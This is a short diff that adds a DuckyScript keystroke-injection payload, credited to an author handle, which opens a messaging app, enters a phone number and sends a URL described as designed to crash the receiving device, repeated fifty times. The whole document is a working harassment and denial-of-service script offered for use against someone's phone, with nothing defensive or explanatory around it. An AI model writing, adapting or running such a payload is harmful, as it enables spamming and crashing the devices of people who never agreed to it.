@@ -1,0 +1,13 @@
+REM Author: @unveroleone | https://github.com/veroleone
+REM Spams a crash-inducing URL via SMS
+DELAY 1000
+STRING Messages
+ENTER
+DELAY 2000
+STRING +1234567890
+ENTER
+DELAY 500
+STRING https://thiswebsiteisdesignedtocrashthedevice.com
+ENTER
+DELAY 500
+REPEAT 50
